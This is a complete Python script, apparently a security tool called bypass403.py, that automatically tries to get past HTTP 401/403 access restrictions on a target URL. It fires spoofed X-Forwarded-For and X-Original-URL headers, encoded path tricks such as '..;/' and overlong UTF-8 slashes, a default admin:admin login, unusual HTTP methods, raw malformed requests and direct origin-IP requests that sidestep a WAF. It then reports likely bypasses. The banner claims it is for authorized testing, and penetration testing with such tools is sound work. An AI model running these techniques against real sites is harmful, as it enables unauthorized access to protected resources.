#!/usr/bin/env python3
"""
bypass403.py - Professional 403/401 Bypass Testing Tool v3.2
For AUTHORIZED security testing only.
"""

import argparse
import hashlib
import json
import socket
import ssl
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse, quote

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("Install requests first: pip install requests")
    sys.exit(1)


class C:
    G = "\033[92m"
    R = "\033[91m"
    Y = "\033[93m"
    C = "\033[96m"
    B = "\033[94m"
    M = "\033[95m"
    W = "\033[97m"
    X = "\033[0m"


BANNER = C.C + "\n======================================================\n     403 BYPASS TOOL  v3.2  -  Professional\n     For authorized security testing only\n======================================================" + C.X


def parse_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    return {
        "full": url,
        "scheme": p.scheme,
        "host": p.netloc,
        "hostname": p.hostname,
        "port": p.port or (443 if p.scheme == "https" else 80),
        "path": p.path or "/",
        "query": p.query,
    }


DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def send(url, method="GET", headers=None, data=None, cookies=None,
         allow_redirects=False, timeout=10, host_header=None):
    h = {"User-Agent": DEFAULT_UA}
    if headers:
        h.update(headers)
    if host_header:
        h["Host"] = host_header
    try:
        return requests.request(
            method=method, url=url, headers=h, data=data,
            cookies=cookies, allow_redirects=allow_redirects,
            verify=False, timeout=timeout
        )
    except Exception:
        return None


def body_hash(content):
    if not content:
        return "empty"
    return hashlib.md5(content).hexdigest()[:10]


def header_signature(resp):
    if resp is None:
        return ""
    keys = ["Content-Type", "Content-Length", "Location", "Set-Cookie",
            "X-Frame-Options", "Content-Security-Policy", "Server",
            "X-Powered-By"]
    return "|".join(str(k) + "=" + str(resp.headers.get(k, ""))[:40] for k in keys)


def classify(resp, base_status, base_body_hash, base_len):
    if resp is None:
        return None, "err", False

    code = resp.status_code
    bh = body_hash(resp.content)
    ln = len(resp.content)

    if ln < 100 and code in (400, 401, 403, 404, 405, 429):
        return code, str(code) + "-empty-block", False

    if 200 <= code < 300:
        if ln > 50 and bh != base_body_hash:
            return code, "BYPASS?", True
        return code, str(code) + "-no-content", False

    if code == base_status and bh == base_body_hash:
        return code, str(code) + "-same", False

    if code in (400, 401, 403, 404, 405, 429):
        return code, str(code) + "-block", False

    if 300 <= code < 400:
        loc = resp.headers.get("Location", "")
        if not loc or loc.endswith("/") or "login" in loc.lower() or "signin" in loc.lower():
            return code, "redirect-fp", False
        return code, "redirect", True

    if code != base_status:
        return code, "status-" + str(code), True

    return code, "status-" + str(code), False


def _t(name, url, method="GET", headers=None, host=None):
    return {"name": name, "url": url, "method": method,
            "headers": headers or {}, "host": host}


def techniques_headers(u):
    out = []
    ip_headers = [
        "X-Forwarded-For", "X-Forwarded", "Forwarded-For", "Forwarded",
        "X-Client-IP", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-ProxyUser-Ip", "X-Original-Remote-Addr",
        "Client-IP", "True-Client-IP", "Cluster-Client-IP",
        "X-Custom-IP-Authorization", "X-Forwarded-For-Original",
        "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
        "X-Azure-SocketIP", "X-Host", "X-Forwarded-Host",
        "X-Original-Host", "X-Forwarded-Server", "X-Proxy-Host",
        "X-Real-Host", "X-Forwarded-Port",
    ]
    for h in ip_headers:
        for ip in ["127.0.0.1", "localhost", "0.0.0.0"]:
            out.append(_t(h + ": " + ip, u["full"], headers={h: ip}))

    url_headers = [
        "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
        "X-Original-Path", "X-Forwarded-Path", "X-Forwarded-Uri",
        "X-Original-URI", "X-Request-URI", "X-Rewrite-Url",
        "X-Original-Request-URI", "X-Script-Name",
    ]
    for h in url_headers:
        out.append(_t(h + ": " + u["path"], u["full"], headers={h: u["path"]}))
        root = u["scheme"] + "://" + u["host"] + "/"
        out.append(_t(h + " override (root)", root, headers={h: u["path"]}))

    for hv in ["localhost", "127.0.0.1", "0.0.0.0",
               u["hostname"] + ":80", u["hostname"] + ":443",
               u["hostname"] + ":8080", "internal", "admin"]:
        out.append(_t("Host: " + hv, u["full"], host=hv))

    out.append(_t("x-forwarded-for lowercase", u["full"], headers={"x-forwarded-for": "127.0.0.1"}))
    out.append(_t("X-FORWARDED-FOR uppercase", u["full"], headers={"X-FORWARDED-FOR": "127.0.0.1"}))
    out.append(_t("Referer: self", u["full"], headers={"Referer": u["full"]}))
    out.append(_t("Referer: root", u["full"], headers={"Referer": u["scheme"] + "://" + u["host"] + "/"}))
    for ct in ["application/json", "text/plain", "application/xml", "application/x-www-form-urlencoded"]:
        out.append(_t("Content-Type: " + ct, u["full"], headers={"Content-Type": ct}))
    out.append(_t("Authorization: Basic admin", u["full"], headers={"Authorization": "Basic YWRtaW46YWRtaW4="}))
    out.append(_t("Authorization: Bearer null", u["full"], headers={"Authorization": "Bearer null"}))
    out.append(_t("Authorization: empty", u["full"], headers={"Authorization": ""}))
    return out


def techniques_paths(u):
    out = []
    base = u["scheme"] + "://" + u["host"]
    path = u["path"].rstrip("/")
    query = "?" + u["query"] if u["query"] else ""

    mutations = [
        ("trailing slash", f"{path}/"),
        ("double slash", f"{path}//"),
        ("triple slash", f"{path}///"),
        ("trailing dot", f"{path}/."),
        ("trailing dot no slash", f"{path}."),
        ("dot slash", f"{path}/./"),
        ("trailing ..;/", f"{path}/..;/"),
        ("trailing /.;/", f"{path}/.;/"),
        ("trailing /%2e/", f"{path}/%2e/"),
        ("trailing /%2e%2e/", f"{path}/%2e%2e/"),
        ("trailing /..%2f", f"{path}/..%2f"),
        ("trailing /%252e%252e/", f"{path}/%252e%252e/"),
        ("trailing %20", f"{path}%20"),
        ("trailing %09 tab", f"{path}%09"),
        ("trailing %0a LF", f"{path}%0a"),
        ("trailing %0d CR", f"{path}%0d"),
        ("trailing %00", f"{path}%00"),
        ("trailing ?", f"{path}?"),
        ("trailing ??", f"{path}??"),
        ("trailing #", f"{path}#"),
        ("trailing #x", f"{path}#x"),
        ("trailing ?.css", f"{path}?.css"),
        ("trailing ?.js", f"{path}?.js"),
        ("trailing ?.html", f"{path}?.html"),
        ("trailing ?_=", f"{path}?_="),
        ("append .json", f"{path}.json"),
        ("append .html", f"{path}.html"),
        ("append .css", f"{path}.css"),
        ("append .bak", f"{path}.bak"),
        ("append .old", f"{path}.old"),
        ("append .zip", f"{path}.zip"),
        ("append ;/", f"{path};/"),
        ("append ;", f"{path};"),
        ("semicolon segment", f"{path}/;/"),
        ("UPPERCASE whole", path.upper() or "/"),
        ("lowercase whole", path.lower() or "/"),
        ("mixed case segment", "/".join(s.capitalize() for s in path.split("/")) or "/"),
        ("backslash append", f"{path}\\\\"),
        ("trailing backslash", f"{path}/\\\\"),
        ("wildcard append /*", f"{path}/*"),
        ("wildcard append /%2a", f"{path}/%2a"),
        ("slash encode one", path.replace("/", "%2f", 1) or "/"),
        ("double-encode one slash", path.replace("/", "%252f", 1) or "/"),
        ("triple-encode slash", path.replace("/", "%25252f", 1) or "/"),
        ("overlong UTF-8 slash", path.replace("/", "%c0%af", 1) or "/"),
    ]

    seen = set()
    for name, m in mutations:
        full = base + m + query
        if full in seen:
            continue
        seen.add(full)
        out.append(_t(name, full))

    segments = [s for s in path.split("/") if s]
    if segments:
        for i in range(len(segments)):
            s = segments.copy()
            s[i] = s[i] + ";"
            out.append(_t("add ; to segment " + str(i), base + "/" + "/".join(s) + query))
            s[i] = s[i] + "/"
            out.append(_t("add / to segment " + str(i), base + "/" + "/".join(s) + query))
    return out


def techniques_methods(u):
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
               "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
               "MOVE", "LOCK", "UNLOCK", "FOO", "BAR", "DEBUG", "TRACK",
               "SEARCH", "REPORT", "PURGE", "ACL", "BASELINE-CONTROL",
               "BIND", "CHECKIN", "CHECKOUT", "LABEL", "LINK", "MERGE",
               "MKACTIVITY", "MKCALENDAR", "MKREDIRECTREF", "MKWORKSPACE",
               "ORDERPATCH", "PRI", "REBIND", "UNBIND", "UNCHECKOUT",
               "UNLINK", "UPDATE", "UPDATEREDIRECTREF", "VERSION-CONTROL",
               "INVALIDMETHOD"]
    return [_t("method " + m, u["full"], method=m) for m in methods]


def techniques_encoding(u):
    out = []
    base = u["scheme"] + "://" + u["host"]
    path = u["path"]
    for i, ch in enumerate(path):
        if ch.isalpha():
            encoded = path[:i] + "%" + format(ord(ch), "02x") + path[i+1:]
            out.append(_t("hex-encode char " + str(i), base + encoded))
    out.append(_t("double-encode whole path", base + quote(path, safe="")))
    return out


def techniques_query(u):
    qs = [
        ("?_=", u["full"] + "?_=" + str(int(time.time()))),
        ("?%00", u["full"] + "?%00"),
        ("?%0a", u["full"] + "?%0a"),
        ("?%0d", u["full"] + "?%0d"),
        ("?debug=1", u["full"] + "?debug=1"),
        ("?test=1", u["full"] + "?test=1"),
        ("?bypass=1", u["full"] + "?bypass=1"),
        ("?admin=1", u["full"] + "?admin=1"),
        ("?role=admin", u["full"] + "?role=admin"),
        ("?is_admin=true", u["full"] + "?is_admin=true"),
        ("?access=1", u["full"] + "?access=1"),
        ("?allow=1", u["full"] + "?allow=1"),
        ("?auth=1", u["full"] + "?auth=1"),
        ("?internal=1", u["full"] + "?internal=1"),
    ]
    return [_t(name, url) for name, url in qs]


def techniques_param_pollution(u):
    path = u["path"]
    base = u["scheme"] + "://" + u["host"]
    return [
        _t("duplicate path via %2f", base + path + "%2f" + path.lstrip("/")),
        _t("duplicate path plain", base + path + "/" + path.lstrip("/")),
        _t("path + ./ + path", base + path + "/./" + path.lstrip("/")),
    ]


def techniques_raw(u):
    tests = []
    host = u["hostname"]
    port = u["port"]
    path = u["path"]
    is_ssl = u["scheme"] == "https"

    raw_payloads = [
        ("HTTP/1.0 minimal", "GET " + path + " HTTP/1.0\r\n\r\n"),
        ("HTTP/0.9", "GET " + path + "\r\n\r\n"),
        ("HTTP/1.1 space in path", "GET " + path + "  HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 tab in path", "GET " + path + "\t HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 double Host", "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nHost: localhost\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 XFF raw", "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 absolute URI", "GET http://" + host + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 ../ path", "GET " + path + "/..;/ HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 long path", "GET " + path + "/" * 50 + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"),
    ]
    for name, payload in raw_payloads:
        tests.append({"name": "raw: " + name, "raw": payload,
                      "host": host, "port": port, "ssl": is_ssl})
    return tests


def raw_request(host, port, is_ssl, payload, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(payload.encode("latin1"))
        data = b""
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if len(data) > 200000:
                break
        s.close()
        return data
    except Exception:
        return None


def parse_raw(data):
    if not data:
        return None, 0, ""
    try:
        first = data.split(b"\r\n", 1)[0].decode("latin1", "ignore")
        parts = first.split(" ", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            return int(parts[1]), len(data), hashlib.md5(data).hexdigest()[:10]
    except Exception:
        pass
    return None, len(data), hashlib.md5(data).hexdigest()[:10] if data else ""


WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "cf-cache-status"],
    "AWS WAF": ["awselb", "x-amz-cf-id", "aws-waf"],
    "Akamai": ["akamai", "ak-bmsc"],
    "Imperva": ["imperva", "incap_ses", "visid_incap"],
    "Sucuri": ["sucuri", "x-sucuri-id"],
    "F5 BIG-IP": ["bigipserver"],
    "Fastly": ["fastly", "x-served-by", "x-fastly"],
    "CloudFront": ["x-amz-cf-id", "cloudfront"],
    "Varnish": ["x-varnish", "via: varnish"],
    "Nginx": ["nginx"],
    "Apache": ["apache"],
    "IIS": ["microsoft-iis"],
}


def detect_waf(resp):
    if resp is None:
        return "unknown"
    hdrs = " ".join(str(k) + ": " + str(v) for k, v in resp.headers.items()).lower()
    body = (resp.text or "")[:2000].lower()
    server = resp.headers.get("Server", "").lower()
    combined = hdrs + " " + body + " " + server
    found = []
    for name, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig in combined:
                found.append(name)
                break
    return ", ".join(found) if found else "none detected"


def test_origin_ip(origin_ip, u, host_header):
    url = u["scheme"] + "://" + origin_ip + u["path"]
    return send(url, method="GET", host_header=host_header)


class BypassEngine:
    def __init__(self, url, delay=0.0, threads=1, origin_ips=None,
                 categories=None, cookies=None, timeout=10,
                 follow_redirects=False):
        self.u = parse_url(url)
        self.delay = delay
        self.threads = max(1, threads)
        self.origin_ips = origin_ips or []
        self.categories = categories
        self.cookies = cookies
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.findings = []
        self.base = None

    def baseline(self):
        r = send(self.u["full"], cookies=self.cookies, timeout=self.timeout)
        if r is None:
            print(C.R + "[!] Cannot reach target." + C.X)
            sys.exit(1)
        self.base = {
            "status": r.status_code,
            "hash": body_hash(r.content),
            "length": len(r.content),
            "headers": header_signature(r),
            "waf": detect_waf(r),
        }
        return r

    def build_tests(self):
        cats = {
            "headers": techniques_headers,
            "paths": techniques_paths,
            "methods": techniques_methods,
            "encoding": techniques_encoding,
            "query": techniques_query,
            "hpp": techniques_param_pollution,
            "raw": techniques_raw,
        }
        tests = []
        for name, fn in cats.items():
            if self.categories and name not in self.categories:
                continue
            tests += fn(self.u)
        return tests

    def run_test(self, t):
        if self.delay:
            time.sleep(self.delay)
        if "raw" in t:
            data = raw_request(t["host"], t["port"], t["ssl"], t["raw"], self.timeout)
            code, ln, h = parse_raw(data)
            if code is None:
                return t, {"ok": False}
            interesting = False
            if code not in (400, 401, 403, 404, 405, 429):
                interesting = (code != self.base["status"]) or (h != self.base["hash"])
            return t, {"ok": True, "status": code, "length": ln,
                       "hash": h, "verdict": "RAW", "interesting": interesting}

        r = send(t["url"], method=t.get("method", "GET"),
                 headers=t.get("headers"), cookies=self.cookies,
                 timeout=self.timeout,
                 allow_redirects=self.follow_redirects,
                 host_header=t.get("host"))
        code, verdict, interesting = classify(
            r, self.base["status"], self.base["hash"], self.base["length"])
        h = body_hash(r.content) if r else ""
        ln = len(r.content) if r else 0
        return t, {"ok": r is not None, "status": code, "length": ln,
                   "hash": h, "verdict": verdict, "interesting": interesting}

    def run(self):
        print(BANNER)
        print(C.B + "[*] Target: " + C.W + self.u["full"] + C.X)
        self.baseline()
        print(C.B + "[*] Baseline: " + C.W + str(self.base["status"]) + C.B +
              " (" + str(self.base["length"]) + "b, hash=" + self.base["hash"] + ")" + C.X)
        print(C.B + "[*] WAF: " + C.Y + self.base["waf"] + C.X)
        if self.base["status"] not in (401, 402, 403):
            print(C.Y + "[!] Baseline is " + str(self.base["status"]) +
                  " (not 401/403). Results may be misleading." + C.X)

        tests = self.build_tests()
        print(C.B + "[*] Loaded " + C.W + str(len(tests)) + C.B + " tests, "
              "threads=" + str(self.threads) + ", delay=" + str(self.delay) + "s" + C.X)
        print(C.C + "-" * 70 + C.X)

        findings = []
        counter = {"done": 0}
        lock = threading.Lock()

        def worker(idx_t):
            idx, t = idx_t
            tt, res = self.run_test(t)
            with lock:
                counter["done"] += 1
                i = counter["done"]
                name = tt["name"]
                if not res["ok"]:
                    print(C.C + "[" + str(i).rjust(3) + "/" + str(len(tests)) + "]" + C.X +
                          " " + name[:44].ljust(46) + " " + C.R + "FAILED" + C.X)
                    return
                code = res["status"]
                ln = res["length"]
                hh = res["hash"]
                verdict = res["verdict"]
                if res["interesting"]:
                    print(C.C + "[" + str(i).rjust(3) + "/" + str(len(tests)) + "]" + C.X +
                          " " + C.G + ">> " + name[:44].ljust(43) + " " +
                          str(code) + " (" + str(ln) + "b) " + verdict + " h=" + hh + C.X)
                    findings.append({
                        "name": name,
                        "url": tt.get("url", "RAW"),
                        "method": tt.get("method", "GET"),
                        "headers": tt.get("headers", {}),
                        "host": tt.get("host"),
                        "status": code, "length": ln, "hash": hh,
                        "verdict": verdict,
                    })
                else:
                    color = C.R if code in (401, 403) else C.Y
                    print(C.C + "[" + str(i).rjust(3) + "/" + str(len(tests)) + "]" + C.X +
                          " " + name[:44].ljust(46) + " " +
                          color + str(code) + C.X + " (" + str(ln) + "b) " + verdict)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(worker, (i, t)) for i, t in enumerate(tests, 1)]
            for _ in as_completed(futures):
                pass

        if self.origin_ips:
            print()
            print(C.C + "-" * 70 + C.X)
            print(C.B + "[*] Testing origin IPs:" + C.X)
            for ip in self.origin_ips:
                for vhost in (self.u["hostname"], self.u["host"]):
                    r = test_origin_ip(ip, self.u, vhost)
                    if r is None:
                        print("    " + C.R + "FAILED" + C.X + " " + ip + " Host=" + vhost)
                        continue
                    code, verdict, interesting = classify(
                        r, self.base["status"], self.base["hash"], self.base["length"])
                    hh = body_hash(r.content)
                    color = C.G if interesting else C.R
                    print("    " + color + str(code) + C.X +
                          " (" + str(len(r.content)) + "b) hash=" + hh +
                          " Host=" + vhost + " -- " + verdict)
                    if interesting:
                        findings.append({
                            "name": "origin-ip " + ip,
                            "url": self.u["scheme"] + "://" + ip + self.u["path"],
                            "method": "GET",
                            "headers": {"Host": vhost},
                            "status": code, "length": len(r.content),
                            "hash": hh, "verdict": verdict,
                        })

        self.findings = findings
        print()
        print(C.C + "=" * 70 + C.X)
        print(C.B + "                     SUMMARY" + C.X)
        print(C.C + "=" * 70 + C.X)
        print(C.B + "[*] Baseline:" + C.X + " " + str(self.base["status"]) +
              " (" + str(self.base["length"]) + "b) hash=" + self.base["hash"])
        print(C.B + "[*] WAF:" + C.X + " " + self.base["waf"])
        print(C.B + "[*] Tests run:" + C.X + " " + str(len(tests)))

        if not findings:
            print()
            print(C.R + "[x] No obvious bypasses found." + C.X)
            print(C.Y + "[i] Common reasons:" + C.X)
            print("    - Hard ACL (nginx deny all, no header trust)")
            print("    - Cloudflare/WAF blocks before origin")
            print("    - Application-level auth enforced properly")
        else:
            print()
            print(C.G + "[+] Potential bypasses (" + str(len(findings)) + "):" + C.X)
            print()
            for f in findings:
                print(C.G + "  >> " + f["name"] + C.X)
                print("      URL:    " + f["url"])
                print("      Method: " + f["method"])
                if f.get("headers"):
                    print("      Headers: " + str(f["headers"]))
                if f.get("host"):
                    print("      Host:   " + f["host"])
                print("      Result: " + str(f["status"]) + " (" + str(f["length"]) + "b) "
                      "hash=" + f["hash"] + " -- " + f["verdict"])
                print()

        return {
            "target": self.u["full"],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "baseline": self.base,
            "tests_run": len(tests),
            "findings": findings,
        }


def render_html(res):
    rows = ""
    for f in res["findings"]:
        rows += (
            "<tr><td><code>" + f["name"] + "</code></td>"
            "<td><code>" + f["method"] + "</code></td>"
            "<td><code>" + str(f["status"]) + "</code></td>"
            "<td>" + str(f["length"]) + "</td>"
            "<td><code>" + str(f.get("headers", {})) + "</code></td>"
            '<td><a href="' + f["url"] + '" target="_blank">' + f["url"] + "</a></td></tr>"
        )
    return (
        '<!doctype html><html><head><meta charset="utf-8">'
        "<title>403 Bypass Report</title>"
        "<style>body{font-family:sans-serif;margin:2em;background:#f5f5f5}"
        "table{border-collapse:collapse;width:100%;background:white}"
        "th,td{border:1px solid #ddd;padding:8px;text-align:left;font-size:13px}"
        "th{background:#333;color:white}code{background:#eee;padding:2px 4px;"
        "border-radius:3px}.baseline{background:#fff3cd;padding:1em;"
        "border-radius:5px;margin-bottom:1em}</style></head><body>"
        "<h1>403 Bypass Report</h1>"
        '<div class="baseline"><b>Target:</b> ' + res["target"] + "<br>"
        "<b>Baseline:</b> " + str(res["baseline"]["status"]) +
        " (" + str(res["baseline"]["length"]) + "b)<br>"
        "<b>WAF:</b> " + res["baseline"]["waf"] + "<br>"
        "<b>Tests run:</b> " + str(res["tests_run"]) + "<br>"
        "<b>Findings:</b> " + str(len(res["findings"])) + "<br>"
        "<b>Timestamp:</b> " + res["timestamp"] + "</div>"
        "<table><tr><th>Technique</th><th>Method</th><th>Status</th>"
        "<th>Length</th><th>Headers</th><th>URL</th></tr>"
        + rows + "</table></body></html>"
    )


def main():
    ap = argparse.ArgumentParser(
        description="Professional 403 Bypass Testing Tool (authorized testing only)")
    ap.add_argument("-u", "--url", required=True, help="Target URL")
    ap.add_argument("--delay", type=float, default=0.0, help="Delay between requests")
    ap.add_argument("--threads", type=int, default=1, help="Concurrent workers")
    ap.add_argument("--origin-ip", action="append", default=[],
                    help="Origin IP(s) to test (repeatable)")
    ap.add_argument("--category", default=None,
                    help="Comma-separated: headers,paths,methods,encoding,query,hpp,raw")
    ap.add_argument("--cookie", default=None, help="Cookie string")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("--save", help="Save JSON report")
    ap.add_argument("--html", help="Save HTML report")

    args = ap.parse_args()

    categories = None
    if args.category:
        categories = [c.strip() for c in args.category.split(",")]

    cookies = None
    if args.cookie:
        cookies = {}
        for part in args.cookie.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v

    engine = BypassEngine(
        url=args.url, delay=args.delay, threads=args.threads,
        origin_ips=args.origin_ip, categories=categories,
        cookies=cookies, timeout=args.timeout,
        follow_redirects=args.follow,
    )
    result = engine.run()

    if args.save:
        with open(args.save, "w") as f:
            json.dump(result, f, indent=2)
        print(C.G + "[+] JSON saved: " + args.save + C.X)
    if args.html:
        with open(args.html, "w") as f:
            f.write(render_html(result))
        print(C.G + "[+] HTML saved: " + args.html + C.X)

    sys.exit(0 if result["findings"] else 1)


if __name__ == "__main__":
    main()
